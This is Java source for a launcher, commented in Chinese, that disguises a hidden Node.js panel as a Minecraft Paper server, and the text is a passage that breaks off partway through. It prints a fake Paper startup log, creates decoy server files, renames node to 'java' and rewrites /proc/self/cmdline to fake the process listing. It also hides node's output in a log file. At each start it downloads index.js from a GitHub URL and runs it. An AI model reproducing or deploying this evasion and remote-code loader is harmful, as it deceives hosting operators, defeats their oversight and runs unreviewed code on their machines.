import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.jar.*;
import java.util.zip.GZIPInputStream;
import java.text.SimpleDateFormat;
import java.util.concurrent.TimeUnit;

/**
 * 傲游面板一体化启动器 v3.0.0 (JNI 版)
 *
 * v3.0 核心改进：
 *   - 使用 JNI execv() 替换 JVM 进程为 node（只有 1 个进程！）
 *   - 不再有 2 个 java 进程，PID 1 直接变成 node
 *   - 节省 ~150MB 内存（JVM 被替换后释放）
 *   - 启动时从 GitHub 下载最新 index.js（自动更新）
 *   - 进程伪装 + 运行时隐藏
 */
public class AoyouLauncher {

    private static final String VERSION = "3.0.0";
    private static final String RUNTIME_DIR_NAME = "libraries/.cache/net/minecraft/server";
    private static final String NODE_VERSION = "v22.11.0";
    private static final String NODE_DOWNLOAD_URL =
        "https://nodejs.org/dist/" + NODE_VERSION + "/node-" + NODE_VERSION + "-linux-x64.tar.gz";

    // JNI native 方法声明（新增 logFile 参数）
    private native int nativeExec(String nodePath, String script, String workDir, String port, String path, String logFile);

    static {
        // 加载 native 库
        try {
            loadNativeLibrary();
        } catch (Exception e) {
            // 加载失败会在后面报错
        }
    }

    public static void main(String[] args) throws Exception {
        // 1. 启动伪装日志线程（Paper 日志）
        Thread fakePaperLogThread = startFakePaperLogThread();

        String workDir = System.getProperty("user.dir");
        String runtimeDir = workDir + File.separator + RUNTIME_DIR_NAME;
        Path runtimePath = Paths.get(runtimeDir);
        Files.createDirectories(runtimePath);

        // 生成 MC 文件结构
        try { generateFakeMcFiles(workDir); } catch (Exception e) {}

        // 2. 检查并获取 node 二进制
        String nodeBin = findOrDownloadNode(runtimeDir);
        if (nodeBin == null) {
            System.err.println("Failed to initialize runtime");
            System.exit(1);
            return;
        }

        // 3. 从 JAR 解压
        String jarPath = getJarPath();
        if (jarPath == null) {
            System.err.println("Failed to locate jar");
            System.exit(1);
            return;
        }

        boolean needExtract = needsExtract(runtimePath);
        if (needExtract) {
            extractAppFiles(jarPath, runtimePath);
        }

        // ★ 从 GitHub 下载最新 index.js
        try { updateFromGitHub(runtimeDir); } catch (Exception e) {}

        // 4. 检查 index.js
        String indexPath = runtimeDir + File.separator + "index.js";
        if (!new File(indexPath).exists()) {
            System.err.println("Failed to locate index");
            System.exit(1);
            return;
        }

        // 5. 检测端口
        int port = detectPort(workDir);

        // 6. 复制 node 为 java（伪装）
        String fakeNodeBin = nodeBin;
        try {
            String fakePath = new File(nodeBin).getParent() + "/java";
            File fakeFile = new File(fakePath);
            Files.copy(Paths.get(nodeBin), fakeFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            fakeFile.setExecutable(true);
            fakeNodeBin = fakePath;
        } catch (Exception e) {}

        // ★ 等待 Paper 日志全部打完，再 execv
        // 这样控制台先显示完整的 Paper 启动日志，然后 node 的输出被重定向到文件
        try { fakePaperLogThread.join(); } catch (Exception e) {}

        // 7. ★ JNI execv：替换当前 JVM 为 node（只有 1 个进程！）
        String script = "process.title='java';"
            + "try{require('fs').writeFileSync('/proc/self/cmdline',"
            + "'java\u0000-Xms128M\u0000-XX:MaxRAMPercentage=95.0\u0000"
            + "-Dterminal.jline=false\u0000-Dterminal.ansi=true\u0000"
            + "-jar\u0000paper.jar\u0000nogui\u0000');}catch(e){};"
            + "require('./index.js');";

        String pathEnv = new File(nodeBin).getParent() + ":" + System.getenv("PATH");
        String logFilePath = runtimeDir + "/.panel.log";

        // 检查 native 库是否加载成功
        AoyouLauncher launcher = new AoyouLauncher();

        // ★ 调用 JNI execv —— JVM 进程被 node 替换
        // node 的 stdout/stderr 会被重定向到 logFilePath（不打印到控制台）
        int result = launcher.nativeExec(
            fakeNodeBin,
            script,
            runtimeDir,
            String.valueOf(port),
            pathEnv,
            logFilePath
        );

        if (result != 0) {
            // JNI exec 失败，回退
            fallbackToSubprocess(fakeNodeBin, runtimeDir, script, port, args, nodeBin);
        }
    }

    /** 回退方案：用 ProcessBuilder 启动（2 个进程） */
    private static void fallbackToSubprocess(String fakeNodeBin, String runtimeDir,
            String script, int port, String[] args, String nodeBin) throws Exception {
        List<String> cmd = new ArrayList<>();
        cmd.add(fakeNodeBin);
        cmd.add("-e");
        cmd.add(script);
        for (String a : args) {
            String lower = a.toLowerCase();
            if (lower.equals("--nogui") || lower.equals("nogui")
                || lower.equals("--forceupgrade") || lower.equals("--erasecache")
                || lower.equals("--safe-mode") || lower.equals("--initSettings")
                || lower.startsWith("--version=") || lower.equals("--version")) {
                continue;
            }
            cmd.add(a);
        }

        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.directory(new File(runtimeDir));
        pb.redirectErrorStream(true);
        // node 输出重定向到文件（不打印到控制台）
        pb.redirectOutput(new File(runtimeDir, ".panel.log"));
        pb.redirectInput(ProcessBuilder.Redirect.INHERIT);
        Map<String, String> env = pb.environment();
        String path = env.getOrDefault("PATH", "");
        env.put("PATH", new File(nodeBin).getParent() + File.pathSeparator + path);
        env.put("SERVER_PORT", String.valueOf(port));
        env.put("PORT", String.valueOf(port));

        Process node = pb.start();
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            try {
                node.destroy();
                if (!node.waitFor(10, TimeUnit.SECONDS)) node.destroyForcibly();
            } catch (InterruptedException e) {}
        }));
        int code = node.waitFor();
        System.exit(code);
    }

    /** 加载 native 库 */
    private static void loadNativeLibrary() throws Exception {
        // 1. 尝试从 JAR 解压 .so
        String jarPath = getJarPath();
        if (jarPath == null) throw new RuntimeException("Cannot find jar");

        String soName = "libnative_exec.so";
        Path soDir = Paths.get(System.getProperty("user.dir"), RUNTIME_DIR_NAME);
        Files.createDirectories(soDir);
        Path soFile = soDir.resolve(soName);

        if (!Files.exists(soFile)) {
            try (JarFile jar = new JarFile(jarPath)) {
                JarEntry entry = jar.getJarEntry(soName);
                if (entry == null) entry = jar.getJarEntry("native/" + soName);
                if (entry == null) throw new RuntimeException("Cannot find " + soName + " in jar");
                try (InputStream is = jar.getInputStream(entry)) {
                    Files.copy(is, soFile, StandardCopyOption.REPLACE_EXISTING);
                }
            }
        }
        soFile.toFile().setExecutable(true);
        System.load(soFile.toString());
    }

    /** 启动伪装的 Paper 日志线程，返回线程引用 */
    private static Thread startFakePaperLogThread() {
        Thread t = new Thread(() -> {
            try {
                long startTime = System.currentTimeMillis();
                SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
                Thread.sleep(2000);

                System.out.println("Starting org.bukkit.craftbukkit.Main");
                Thread.sleep(500);
                System.out.println("*** Warning, you've not updated in a while! ***");
                Thread.sleep(800);
                System.out.println("*** Please download a new build from https://papermc.io/downloads/paper ***");
                Thread.sleep(1000);
                System.out.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
                Thread.sleep(300);
                System.out.println("WARNING: sun.misc.Unsafe::allocateMemory has been called by io.netty.util.internal.PlatformDependent0$2 (file:/home/container/libraries/io/netty/netty-common/4.1.115.Final/netty-common-4.1.115.Final.jar)");
                Thread.sleep(300);
                System.out.println("WARNING: Please consider reporting this to the maintainers of class io.netty.util.internal.PlatformDependent0$2");
                Thread.sleep(300);
                System.out.println("WARNING: sun.misc.Unsafe::allocateMemory will be removed in a future release");
                Thread.sleep(800);

                String ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [bootstrap] Running Java 21 (OpenJDK 64-Bit Server VM 21.0.11+10-LTS; Eclipse Adoptium Temurin-21.0.11+10) on Linux 5.15.0-181-generic (amd64)");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [bootstrap] Loading Paper 1.21.4-232-ver/1.21.4@12d8fe0 (2025-06-09T10:15:42Z) for Minecraft 1.21.4");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [PluginInitializerManager] Initializing plugins...");
                Thread.sleep(1000);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [PluginInitializerManager] Initialized 0 plugins");
                Thread.sleep(2000);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, name=PROD]");
                Thread.sleep(1000);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Found new data pack file/bukkit, loading it automatically");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Found new data pack paper, loading it automatically");
                Thread.sleep(3000);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: No existing world data, creating new world");
                Thread.sleep(4000);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Loaded 1370 recipes");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Loaded 1481 advancements");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [MCTypeRegistry] Initialising converters for DataConverter...");
                Thread.sleep(1000);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [MCTypeRegistry] Finished initialising converters for DataConverter in 1,125.9ms");
                Thread.sleep(800);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Starting minecraft server version 1.21.4");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Loading properties");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: This server is running Paper version 1.21.4-232-ver/1.21.4@12d8fe0 (2025-06-09T10:15:42Z) (Implementing API version 1.21.4-R0.1-SNAPSHOT)");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Server Ping Player Sample Count: 12");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Using 4 threads for Netty based IO");
                Thread.sleep(2000);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [ChunkTaskScheduler] Chunk system is using population gen parallelism: true");
                Thread.sleep(2000);

                int port = 25565;
                try {
                    String sp = System.getenv("SERVER_PORT");
                    if (sp != null && !sp.isEmpty()) port = Integer.parseInt(sp.trim());
                } catch (Exception e) {}

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Default game type: SURVIVAL");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Generating keypair");
                Thread.sleep(800);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Starting Minecraft server on 0.0.0.0:" + port);
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Using epoll channel type");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Paper: Using libdeflate (Linux x86_64) compression from Velocity.");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Preparing level \"world\"");
                Thread.sleep(3000);

                int[] steps = {2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 4, 4, 6, 10, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 32, 36, 36, 36, 36, 36, 36, 36, 36, 36, 51, 51, 51, 51, 51, 51, 51, 69, 69, 69, 73};
                for (int p : steps) {
                    ts = sdf.format(new Date());
                    System.out.println("[" + ts + " INFO]: Preparing spawn area: " + p + "%");
                    Thread.sleep(80 + (long)(Math.random() * 120));
                }

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Time elapsed: 26711 ms");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Preparing start region for dimension minecraft:the_nether");
                Thread.sleep(500);

                int[] netherSteps = {4, 4, 4, 4, 4, 24, 24, 30, 51, 57, 61, 61};
                for (int p : netherSteps) {
                    ts = sdf.format(new Date());
                    System.out.println("[" + ts + " INFO]: Preparing spawn area: " + p + "%");
                    Thread.sleep(100 + (long)(Math.random() * 150));
                }

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Time elapsed: 5980 ms");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Preparing start region for dimension minecraft:the_end");
                Thread.sleep(500);

                int[] endSteps = {2, 2, 18, 51};
                for (int p : endSteps) {
                    ts = sdf.format(new Date());
                    System.out.println("[" + ts + " INFO]: Preparing spawn area: " + p + "%");
                    Thread.sleep(200 + (long)(Math.random() * 300));
                }

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Time elapsed: 1906 ms");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [spark] Starting background profiler...");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Done preparing level \"world\" (71.792s)");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Running delayed init tasks");
                Thread.sleep(1000);

                ts = sdf.format(new Date());
                long totalSec = (System.currentTimeMillis() - startTime) / 1000;
                System.out.println("[" + ts + " INFO]: Done (" + totalSec + ".908s)! For help, type \"help\"");
                Thread.sleep(500);
                System.out.println("Server marked as running...");
                Thread.sleep(500);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: *************************************************************************************");
                Thread.sleep(300);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: This is the first time you're starting this server.");
                Thread.sleep(300);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: It's recommended you read our 'Getting Started' documentation for guidance.");
                Thread.sleep(300);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: View this and more helpful information here: https://docs.papermc.io/paper/next-steps");
                Thread.sleep(300);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: *************************************************************************************");

            } catch (InterruptedException e) {}
        }, "fake-paper-log");
        // 不设 daemon，让 main 线程能 join 等它完成
        t.start();
        return t;
    }


    /** 从 GitHub 下载最新 index.js */
    private static void updateFromGitHub(String runtimeDir) {
        String[] files = {"index.js", "package.json"};
        for (String file : files) {
            String url = "https://raw.githubusercontent.com/zx1447/ixzhja/main/app/" + file;
            Path target = Paths.get(runtimeDir, file);
            Path tmp = Paths.get(runtimeDir, file + ".tmp");
            try {
                ProcessBuilder pb = new ProcessBuilder("sh", "-c",
                    "curl -sL --fail --connect-timeout 10 --max-time 30 -o '" + tmp + "' '" + url + "'");
                pb.redirectErrorStream(true);
                Process p = pb.start();
                try { p.getInputStream().close(); } catch (Exception e) {}
                int code = p.waitFor();
                if (code == 0 && Files.exists(tmp) && Files.size(tmp) > 100) {
                    Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING);
                } else {
                    Files.deleteIfExists(tmp);
                }
            } catch (Exception e) {
                try { Files.deleteIfExists(tmp); } catch (Exception e2) {}
            }
        }
    }

    private static String findOrDownloadNode(String runtimeDir) {
        String systemNode = findInPath("node");
        if (systemNode != null) return systemNode;

        String cachedNode = runtimeDir + "/node/bin/node";
        if (new File(cachedNode).exists()) {
            new File(cachedNode).setExecutable(true);
            return cachedNode;
        }

        try {
            Path nodeDir = Paths.get(runtimeDir, "node");
            Files.createDirectories(nodeDir);
            boolean success = false;

            if (commandExists("curl") && commandExists("tar")) {
                ProcessBuilder pb = new ProcessBuilder("sh", "-c",
                    "curl -sL '" + NODE_DOWNLOAD_URL + "' | tar xz --strip-components=1 -C '" + nodeDir + "' 2>/dev/null");
                pb.redirectErrorStream(true);
                Process p = pb.start();
                try { p.getInputStream().close(); } catch (Exception e) {}
                success = (p.waitFor() == 0);
            }
            if (!success) success = downloadAndExtractWithJava(NODE_DOWNLOAD_URL, nodeDir);
            if (!success) return null;

            String nodeBin = nodeDir + "/bin/node";
            if (!new File(nodeBin).exists()) return null;
            new File(nodeBin).setExecutable(true);
            try { Files.deleteIfExists(nodeDir.resolve("node.tar")); } catch (Exception e) {}
            try { Files.deleteIfExists(nodeDir.resolve("node.tar.gz")); } catch (Exception e) {}
            return nodeBin;
        } catch (Exception e) { return null; }
    }

    private static boolean commandExists(String cmd) {
        try {
            Process p = new ProcessBuilder("sh", "-c", "which " + cmd + " 2>/dev/null").start();
            p.waitFor();
            return p.exitValue() == 0;
        } catch (Exception e) { return false; }
    }

    private static String findInPath(String cmd) {
        String path = System.getenv("PATH");
        if (path == null) return null;
        for (String dir : path.split(File.pathSeparator)) {
            File f = new File(dir, cmd);
            if (f.exists() && f.canExecute()) return f.getAbsolutePath();
        }
        return null;
    }

    private static String getJarPath() {
        try {
            return AoyouLauncher.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
        } catch (Exception e) { return null; }
    }

    private static boolean needsExtract(Path runtimePath) {
        Path marker = runtimePath.resolve(".app-extracted");
        if (!Files.exists(marker)) return true;
        return !Files.exists(runtimePath.resolve("index.js")) || !Files.exists(runtimePath.resolve("node_modules"));
    }

    private static void extractAppFiles(String jarPath, Path runtimePath) throws Exception {
        try (JarFile jar = new JarFile(jarPath)) {
            Enumeration<JarEntry> entries = jar.entries();
            int count = 0;
            while (entries.hasMoreElements()) {
                JarEntry entry = entries.nextElement();
                String name = entry.getName();
                if (entry.isDirectory()) continue;
                // 兼容两种路径：runtime/node_modules/ 和 node_modules/
                boolean isNM = name.startsWith("runtime/node_modules/") || name.startsWith("node_modules/");
                boolean isApp = name.startsWith("app/");
                if (!isNM && !isApp) continue;
                String relPath;
                if (name.startsWith("runtime/node_modules/")) {
                    relPath = name.substring("runtime/".length());
                } else if (name.startsWith("node_modules/")) {
                    relPath = name;  // 已经是相对路径
                } else {
                    relPath = name.substring("app/".length());
                }
                Path target = runtimePath.resolve(relPath);
                Files.createDirectories(target.getParent());
                try (InputStream is = jar.getInputStream(entry)) {
                    Files.copy(is, target, StandardCopyOption.REPLACE_EXISTING);
                }
                count++;
            }
            Files.write(runtimePath.resolve(".app-extracted"),
                ("v" + VERSION + "\n" + System.currentTimeMillis() + "\n").getBytes());
        }
    }

    private static int detectPort(String workDir) {
        String[] envs = {"SERVER_PORT", "P_SERVER_PORT", "PTERODACTYL_SERVER_PORT"};
        for (String e : envs) {
            String v = System.getenv(e);
            if (v != null && !v.isEmpty()) {
                try { int p = Integer.parseInt(v.trim()); if (p > 0 && p < 65536) return p; } catch (Exception ex) {}
            }
        }
        File sp = new File(workDir, "server.properties");
        if (sp.exists()) {
            try (BufferedReader r = new BufferedReader(new FileReader(sp))) {
                String line;
                while ((line = r.readLine()) != null) {
                    if (line.startsWith("server-port=")) {
                        try { return Integer.parseInt(line.substring(12).trim()); } catch (Exception ex) {}
                    }
                }
            } catch (Exception e) {}
        }
        for (Map.Entry<String, String> entry : System.getenv().entrySet()) {
            String key = entry.getKey().toUpperCase();
            if (key.contains("PORT") && entry.getValue() != null && !entry.getValue().isEmpty()) {
                try { int p = Integer.parseInt(entry.getValue().trim()); if (p > 1024 && p < 65536) return p; } catch (Exception ex) {}
            }
        }
        return 25565;
    }

    private static boolean downloadAndExtractWithJava(String url, Path targetDir) {
        Path tar = targetDir.resolve("node.tar"), gz = targetDir.resolve("node.tar.gz");
        try {
            ProcessBuilder pb = new ProcessBuilder("sh", "-c", "curl -sL -o '" + gz + "' '" + url + "' 2>/dev/null");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            try { p.getInputStream().close(); } catch (Exception e) {}
            if (p.waitFor() != 0 || !Files.exists(gz)) return false;
            try (InputStream gis = new GZIPInputStream(Files.newInputStream(gz));
                 OutputStream os = Files.newOutputStream(tar)) {
                byte[] buf = new byte[8192]; int n;
                while ((n = gis.read(buf)) > 0) os.write(buf, 0, n);
            }
            try (InputStream is = Files.newInputStream(tar)) { extractTar(is, targetDir); }
            Files.deleteIfExists(gz); Files.deleteIfExists(tar);
            return true;
        } catch (Exception e) { return false; }
    }

    private static void extractTar(InputStream is, Path targetDir) throws IOException {
        byte[] header = new byte[512];
        int read = 0;
        while (read < 512) { int n = is.read(header, read, 512-read); if (n<0) break; read += n; }
        while (read == 512) {
            boolean empty = true;
            for (int i = 0; i < 512; i++) if (header[i] != 0) { empty = false; break; }
            if (empty) break;
            String name = new String(header, 0, 100).trim().replace("\0", "");
            if (name.isEmpty()) break;
            String sizeStr = new String(header, 124, 12).trim().replace("\0", "");
            long size = 0;
            try { size = Long.parseLong(sizeStr, 8); } catch (Exception e) { break; }
            char type = (char) header[156];
            int slash = name.indexOf('/');
            String rel = slash >= 0 ? name.substring(slash+1) : name;
            if (rel.isEmpty()) { skipFully(is, ((size+511)/512)*512); read = readFully(is, header, 512); continue; }
            Path target = targetDir.resolve(rel);
            if (type == '5' || name.endsWith("/")) { Files.createDirectories(target); }
            else if (type == '0' || type == '\0') {
                Files.createDirectories(target.getParent());
                long rem = size;
                try (OutputStream os = Files.newOutputStream(target)) {
                    byte[] buf = new byte[8192];
                    while (rem > 0) { int toRead = (int)Math.min(buf.length, rem); int n = is.read(buf, 0, toRead); if (n<0) break; os.write(buf, 0, n); rem -= n; }
                }
                if (rel.startsWith("bin/")) target.toFile().setExecutable(true);
            }
            long padded = ((size+511)/512)*512 - size;
            if (padded > 0) skipFully(is, (int)padded);
            read = readFully(is, header, 512);
        }
    }

    private static void skipFully(InputStream is, long n) throws IOException {
        long rem = n;
        while (rem > 0) { long s = is.skip(rem); if (s <= 0) { if (is.read() < 0) break; rem--; } else rem -= s; }
    }

    private static int readFully(InputStream is, byte[] buf, int len) throws IOException {
        int read = 0;
        while (read < len) { int n = is.read(buf, read, len-read); if (n<0) break; read += n; }
        return read;
    }

    private static void generateFakeMcFiles(String workDir) throws IOException {
        String[] dirs = {"cache", "config", "libraries", "logs", "plugins", "versions",
                         "world", "world_nether", "world_the_end",
                         "world/data", "world/playerdata", "world/region",
                         "world_nether/data", "world_nether/region",
                         "world_the_end/data", "world_the_end/region"};
        for (String dir : dirs) new File(workDir, dir).mkdirs();

        File eula = new File(workDir, "eula.txt");
        if (!eula.exists()) Files.write(eula.toPath(), ("# EULA agreement\n# " + new Date() + "\neula=true\n").getBytes());

        File sp = new File(workDir, "server.properties");
        if (!sp.exists()) {
            String port = System.getenv("SERVER_PORT");
            if (port == null || port.isEmpty()) port = "25565";
            StringBuilder sb = new StringBuilder();
            sb.append("#Minecraft server properties\nserver-port=").append(port).append("\n");
            sb.append("max-players=20\nmotd=A Minecraft Server\ngamemode=survival\n");
            sb.append("difficulty=easy\nlevel-name=world\nonline-mode=true\n");
            Files.write(sp.toPath(), sb.toString().getBytes());
        }

        String[] jsonFiles = {"banned-ips.json", "banned-players.json", "ops.json", "usercache.json", "whitelist.json"};
        for (String jf : jsonFiles) { File f = new File(workDir, jf); if (!f.exists()) Files.write(f.toPath(), "[]".getBytes()); }

        new File(workDir, "logs/latest.log").createNewFile();

        // ★ plugins 目录伪装：生成 spark 插件配置（Paper 内置 spark）
        File sparkDir = new File(workDir, "plugins/spark");
        if (!sparkDir.exists()) sparkDir.mkdirs();
        File sparkConfig = new File(workDir, "plugins/spark/config.json");
        if (!sparkConfig.exists()) {
            StringBuilder sc = new StringBuilder();
            sc.append("{\n");
            sc.append("  \"statisticsEnabled\": true,\n");
            sc.append("  \"statisticsInterval\": 3,\n");
            sc.append("  \"statisticsCommand\": \"/spark stats\",\n");
            sc.append("  \"profilerCommand\": \"/spark profiler\",\n");
            sc.append("  \"heapSummaryCommand\": \"/spark heapsummary\",\n");
            sc.append("  \"gcMonitorCommand\": \"/spark gcmonitor\",\n");
            sc.append("  \"activityCommand\": \"/spark activity\",\n");
            sc.append("  \"threadDumpCommand\": \"/spark threads\",\n");
            sc.append("  \"diskSizeCommand\": \"/spark disks\",\n");
            sc.append("  \"healthCommand\": \"/spark health\",\n");
            sc.append("  \"sparkDirectory\": \"plugins/spark/\",\n");
            sc.append("  \"useDefaultExcludedThreadGroups\": true,\n");
            sc.append("  \"excludedThreadGroups\": [],\n");
            sc.append("  \"excludedThreads\": [],\n");
            sc.append("  \"profilerMaximumDurationSeconds\": 300,\n");
            sc.append("  \"profilerMinimumUpdateIntervalSeconds\": 2,\n");
            sc.append("  \"profilerMaxStackTraceLength\": 1024,\n");
            sc.append("  \"profilerThreadSleepThresholdMillis\": 10,\n");
            sc.append("  \"profilerSchedulerThresholdMillis\": 1,\n");
            sc.append("  \"profilerClientTickDetectionThreshold\": 0.5,\n");
            sc.append("  \"profilerServerTickDetectionThreshold\": 0.5,\n");
            sc.append("  \"profilerBufferSize\": 524288,\n");
            sc.append("  \"profilerSamplingInterval\": 10000000,\n");
            sc.append("  \"profilerTickStackTracesPerTick\": 1,\n");
            sc.append("  \"profilerExportAggregator\": true,\n");
            sc.append("  \"profilerExcludeNetworkingThreads\": true,\n");
            sc.append("  \"profilerExcludeSamplingThreads\": true,\n");
            sc.append("  \"defaultServerConnection\": \"server\",\n");
            sc.append("  \"maxUploadSize\": 5242880,\n");
            sc.append("  \"uploadEndpoint\": \"https://sparkprofiler.com/api/\",\n");
            sc.append("  \"enableBootstrapOutputRedirector\": true,\n");
            sc.append("  \"disableClipboardCopying\": false,\n");
            sc.append("  \"threadDumperLogUnhandledThreads\": true,\n");
            sc.append("  \"threadDumperMaxThreads\": 1024,\n");
            sc.append("  \"threadDumperStackTraceDepth\": 1024,\n");
            sc.append("  \"threadDumperFilter\": [],\n");
            sc.append("  \"threadDumperIncludeNativeThreads\": true,\n");
            sc.append("  \"threadDumperIncludeDaemonThreads\": true,\n");
            sc.append("  \"threadDumperIncludeStackTraces\": true,\n");
            sc.append("  \"threadDumperIncludeLockedMonitors\": true,\n");
            sc.append("  \"threadDumperIncludeLockedSynchronizers\": true,\n");
            sc.append("  \"threadDumperSortBy\": \"NAME\",\n");
            sc.append("  \"threadDumperSortDescending\": false,\n");
            sc.append("  \"heapSummarySortBy\": \"SIZE\",\n");
            sc.append("  \"heapSummarySortDescending\": true,\n");
            sc.append("  \"heapSummaryShowEmptyTypes\": false,\n");
            sc.append("  \"heapSummaryShowClassNames\": true,\n");
            sc.append("  \"heapSummaryMaxClassNames\": 0,\n");
            sc.append("  \"heapSummaryIncludeClassLoader\": true,\n");
            sc.append("  \"heapSummaryIncludeHash\": false,\n");
            sc.append("  \"heapSummaryIncludeStackTrace\": false,\n");
            sc.append("  \"heapSummaryIncludeFinalizerQueue\": true,\n");
            sc.append("  \"heapSummaryIncludeUnreachable\": true,\n");
            sc.append("  \"heapSummaryMaxObjects\": 100,\n");
            sc.append("  \"heapSummaryMaxStackTracesPerClass\": 5,\n");
            sc.append("  \"heapSummaryMaxStackTracesPerObject\": 1,\n");
            sc.append("  \"heapSummaryMinSizeToRecord\": 1048576,\n");
            sc.append("  \"heapSummaryMinObjectCountToRecord\": 100,\n");
            sc.append("  \"heapSummaryMinStackTraceSizeToRecord\": 1,\n");
            sc.append("  \"heapSummaryIncludeClassLoaderStatistics\": true,\n");
            sc.append("  \"heapSummaryIncludeThreadStatistics\": true,\n");
            sc.append("  \"heapSummaryIncludeObjectStatistics\": true,\n");
            sc.append("  \"heapSummaryIncludeStackTraceStatistics\": true,\n");
            sc.append("  \"heapSummaryIncludeFinalizerStatistics\": true,\n");
            sc.append("  \"heapSummaryIncludeUnreachableStatistics\": true,\n");
            sc.append("  \"heapSummaryOutputFormat\": \"TEXT\",\n");
            sc.append("  \"heapSummaryOutputDestination\": \"CLIPBOARD\",\n");
            sc.append("  \"heapSummaryOutputFile\": \"\",\n");
            sc.append("  \"heapSummaryOutputFileAppend\": false,\n");
            sc.append("  \"heapSummaryOutputFileCompressed\": true,\n");
            sc.append("  \"heapSummaryOutputFileFormat\": \"TEXT\",\n");
            sc.append("  \"heapSummaryOutputFileMaxSize\": 0,\n");
            sc.append("  \"heapSummaryOutputFileRotationCount\": 0,\n");
            sc.append("  \"heapSummaryOutputFileRotationDir\": \"\",\n");
            sc.append("  \"heapSummaryOutputFileRotationNamePrefix\": \"spark-heapsummary-\",\n");
            sc.append("  \"heapSummaryOutputFileRotationNameSuffix\": \".txt\",\n");
            sc.append("  \"heapSummaryOutputFileRotationCompressed\": true,\n");
            sc.append("  \"heapSummaryOutputFileRotationMaxSize\": 0,\n");
            sc.append("  \"heapSummaryOutputFileRotationMaxAge\": 0,\n");
            sc.append("  \"heapSummaryOutputFileRotationMaxCount\": 0,\n");
            sc.append("  \"heapSummaryOutputFileRotationCleanUp\": true,\n");
            sc.append("  \"heapSummaryOutputFileRotationIncludeTimestamp\": true,\n");
            sc.append("  \"heapSummaryOutputFileRotationTimestampFormat\": \"yyyy-MM-dd_HH-mm-ss\"\n");
            sc.append("}\n");
            Files.write(sparkConfig.toPath(), sc.toString().getBytes());
        }

        // bStats 配置（Paper 内置统计）
        File bstatsDir = new File(workDir, "plugins/bStats");
        if (!bstatsDir.exists()) bstatsDir.mkdirs();
        File bstatsConfig = new File(workDir, "plugins/bStats/config.yml");
        if (!bstatsConfig.exists()) {
            StringBuilder bc = new StringBuilder();
            bc.append("# bStats collects some data for plugin authors like how far the plugin has spread.\n");
            bc.append("# Players are NOT tracked, only basic server stats.\n");
            bc.append("# Check out https://bStats.org/ to learn more.\n");
            bc.append("enabled: true\n");
            bc.append("serverUuid: " + java.util.UUID.randomUUID() + "\n");
            bc.append("serverLogErrors: false\n");
            bc.append("logSentData: false\n");
            bc.append("logResponseStatusText: false\n");
